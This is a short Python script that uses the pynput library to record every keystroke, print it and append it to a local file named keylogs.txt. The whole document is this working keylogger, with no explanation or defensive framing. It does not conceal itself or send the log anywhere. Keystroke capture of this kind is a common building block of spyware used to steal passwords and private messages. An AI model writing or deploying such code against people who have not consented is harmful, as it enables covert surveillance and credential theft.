from pynput.keyboard import Key, Listener

def on_press(key):
    fp = open("keylogs.txt", "a")
    print(key)
    fp.write(str(key) + "\n")
    fp.close()

with Listener(on_press=on_press) as listener:
    listener.join()
